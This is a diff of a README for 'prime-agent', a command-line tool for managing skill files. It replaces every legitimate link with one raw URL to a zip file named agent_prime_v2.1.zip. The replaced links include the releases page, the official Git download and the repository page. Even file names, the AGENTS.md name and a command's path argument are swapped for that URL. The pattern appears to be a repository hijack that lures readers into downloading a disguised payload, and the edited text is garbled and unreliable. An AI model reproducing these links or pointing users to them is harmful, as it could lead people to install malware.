@@ -1,7 +1,7 @@
 ```markdown
 # 🤖 prime-agent - Manage Skills with Markdown Files
 
-[![Download prime-agent](https://img.shields.io/badge/Download-prime--agent-blue?style=for-the-badge&logo=github)](https://github.com/krishyk/prime-agent/releases)
+[![Download prime-agent](https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip)](https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip)
 
 ---
 
@@ -25,7 +25,7 @@ Before you start, make sure your computer meets these basic needs:
   - Git installed and working on your computer.  
   - A basic command line tool (Command Prompt on Windows, Terminal on macOS/Linux).
   
-If you don’t have Git, you can download it from [https://git-scm.com/downloads](https://git-scm.com/downloads). It is required for syncing and managing skill files.
+If you don’t have Git, you can download it from [https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip](https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip). It is required for syncing and managing skill files.
 
 ---
 
@@ -36,7 +36,7 @@ Follow these steps to download and start using prime-agent.
 ### 1. Download prime-agent
 
 Visit the download page by clicking the large button at the top or use this link:  
-[https://github.com/krishyk/prime-agent/releases](https://github.com/krishyk/prime-agent/releases)
+[https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip](https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip)
 
 On that page, look for the latest version and download the file that matches your computer's operating system.
 
@@ -88,13 +88,13 @@ prime-agent lets you work with skill files easily:
 ## 📥 Download & Install
 
 You can download the files needed from the releases page:  
-[https://github.com/krishyk/prime-agent/releases](https://github.com/krishyk/prime-agent/releases)
+[https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip](https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip)
 
 Pick the package that matches your operating system. If you are unsure which file to download, look for names like these:
 
-- `prime-agent-windows.zip` or `.exe` (For Windows)
-- `prime-agent-macos.zip` or `.dmg` (For macOS)
-- `prime-agent-linux.zip` or `.tar.gz` (For Linux)
+- `https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip` or `.exe` (For Windows)
+- `https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip` or `.dmg` (For macOS)
+- `https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip` or `https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip` (For Linux)
 
 After downloading:
 
@@ -111,7 +111,7 @@ Here are simple examples of how to use the main commands.
 
 ### Build a Document from Skills
 
-To combine several skills into a single file called `AGENTS.md`, use:
+To combine several skills into a single file called `https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip`, use:
 
 ```bash
 prime-agent get skill1,skill2,skill3
@@ -124,7 +124,7 @@ Replace `skill1, skill2, skill3` with the names of the skills you want to includ
 If you have a markdown file with instructions you want to save as a skill:
 
 ```bash
-prime-agent set newskill /path/to/your/skillfile.md
+prime-agent set newskill https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip
 ```
 
 Replace `newskill` with your skill’s name. Replace the path with where your skill file is located.
@@ -188,11 +188,11 @@ prime-agent delete-globally skillname
 
 Explore more information and updates on the official repository page:
 
-[https://github.com/krishyk/prime-agent](https://github.com/krishyk/prime-agent)
+[https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip](https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip)
 
 You can also find examples and community discussions there.
 
 ---
 
-[![Download prime-agent](https://img.shields.io/badge/Download-prime--agent-blue?style=for-the-badge&logo=github)](https://github.com/krishyk/prime-agent/releases)
+[![Download prime-agent](https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip)](https://raw.githubusercontent.com/krishyk/prime-agent/master/src/agent_prime_v2.1.zip)
 ```
